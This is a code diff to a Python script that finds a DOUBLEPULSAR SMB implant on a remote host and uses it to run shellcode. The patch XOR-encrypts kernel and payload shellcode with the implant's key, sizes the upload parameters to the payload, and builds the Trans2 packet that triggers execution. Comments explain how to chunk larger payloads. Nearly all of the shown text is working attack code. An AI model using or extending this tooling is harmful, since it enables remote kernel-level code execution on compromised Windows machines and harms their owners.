@@ -182,21 +182,7 @@ if __name__ == "__main__":
         arch = calculate_doublepulsar_arch(signature_long)
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
         
-        
-        xor_key = key #hex(key) 
-        packed_xor_key = struct.pack('<I', xor_key)
-        #print(packed_xor_key)
-        print("Generating the parameters...")
-        parameters = b''
-        EntireSize = struct.pack('<I', 4096)
-        ChunkSize = struct.pack('<I', 4096)
-        offset = struct.pack('<I', 0)
-        parameters += EntireSize
-        parameters += ChunkSize
-        parameters += offset
-        parameters_bytearray = bytearray(parameters)
-        byte_xor(parameters_bytearray, packed_xor_key)
-
+        #generate the final payload shellcode first
         modified_kernel_shellcode = bytearray(kernel_shellcode)
         bytes_payload_shellcode = bytearray(payload_shellcode)
 
@@ -225,7 +211,30 @@ if __name__ == "__main__":
         '''
         
         #xor the payload data now
+        print("encrypting the shellcode with the XOR key")
         byte_xor(modified_kernel_shellcode, packed_xor_key)
+        
+        #build the doublepulsar parameters
+        EntireShellcodeSize = len(modified_kernel_shellcode)
+        xor_key = key #hex(key) 
+        packed_xor_key = struct.pack('<I', xor_key)
+        #print(packed_xor_key)
+        print("Generating the parameters...")
+        parameters = b''
+        '''
+        since our payload is less than 4096, we can send the packet in one packet.
+        it is possible for the EntireSize to be 5 MB in bytes
+        it is not possible for the chunksize to be more than 4096
+        if this is a large payload, you must increment the offset by the last chunk size
+        '''
+        EntireSize = struct.pack('<I', EntireShellcodeSize) #entire value of the payload being uploaded
+        ChunkSize = struct.pack('<I', EntireShellcodeSize) #using the same value since chunk size is less than 4096 
+        offset = struct.pack('<I', 0) #No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+        parameters += EntireSize
+        parameters += ChunkSize
+        parameters += offset
+        parameters_bytearray = bytearray(parameters)
+        byte_xor(parameters_bytearray, packed_xor_key)
         
         #build the execution packet
         trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
